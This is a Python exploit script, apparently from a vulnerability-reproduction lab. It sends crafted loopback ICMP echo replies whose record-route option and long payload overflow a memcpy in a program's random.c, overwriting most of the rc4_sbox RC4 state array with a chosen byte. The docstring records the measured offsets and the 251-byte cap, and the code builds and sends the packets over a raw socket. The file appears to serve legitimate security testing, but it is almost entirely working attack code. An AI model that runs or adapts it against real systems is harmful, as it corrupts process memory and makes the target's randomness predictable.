#!/usr/bin/env python3
"""Loopback-only crafted ICMP echo reply whose long payload fills every
attacker-reachable byte of random.c's rc4_sbox with one chosen constant.

W2 measured the packet-to-global mapping in the real plain build:
old_rr[46+k] == ICMP payload[k], and rc4_sbox starts at old_rr+64, so
rc4_sbox[n] == payload[18+n].  The memcpy length is capped at 251, so the
attacker can reach sbox[0..186] with payload bytes 18..204.  Bytes 0..17 stay
a unique marker so the checker can locate the crafted state in the GDB log.

Traffic stays on 127.0.0.2 -> 127.0.0.1; AF_INET/IP_HDRINCL raw socket.
No pinned source is edited.
"""
import argparse
import socket
import struct
import time

from inject_rr import csum

LEAD = bytes(range(0xA0, 0xA0 + 18))
TAIL_LEN = 187  # payload[18 .. 18+186] -> rc4_sbox[0 .. 186]


def frame(pid, rr_len, ptr, fill):
    ident = pid & 0xFFFF
    payload = LEAD + bytes([fill]) * TAIL_LEN
    icmp = struct.pack("!BBH", 0, 0, 0) + struct.pack("<H", ident) + struct.pack("!H", 0)
    icmp += payload
    opts = bytes([7, rr_len & 0xFF, ptr & 0xFF]) + bytes(range(0xA0, 0xA0 + 36)) + b"\0"
    assert len(opts) == 40
    total_len = 20 + len(opts) + len(icmp)
    ip = struct.pack("!BBHHHBBH4s4s", 0x4F, 0, total_len, 0x1234, 0, 64, 1, 0,
                     socket.inet_aton("127.0.0.2"), socket.inet_aton("127.0.0.1"))
    ip += opts
    ip = ip[:10] + struct.pack("!H", csum(ip)) + ip[12:]
    return ip + icmp


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--pid", type=int, required=True)
    ap.add_argument("--rr-len", type=int, default=255)
    ap.add_argument("--ptr", type=int, default=255)
    ap.add_argument("--fill", type=int, default=0x20)
    ap.add_argument("--count", type=int, default=3)
    ap.add_argument("--gap", type=float, default=0.15)
    a = ap.parse_args()
    packet = frame(a.pid, a.rr_len, a.ptr, a.fill)
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    try:
        for _ in range(a.count):
            s.sendto(packet, ("127.0.0.1", 0))
            time.sleep(a.gap)
    finally:
        s.close()
    print("injected %d constant-fill frames: fill=0x%02x payload=%d rr_len=%d pid=%d" %
          (a.count, a.fill, len(packet) - 20 - 40 - 8, a.rr_len, a.pid))


if __name__ == "__main__":
    raise SystemExit(main())
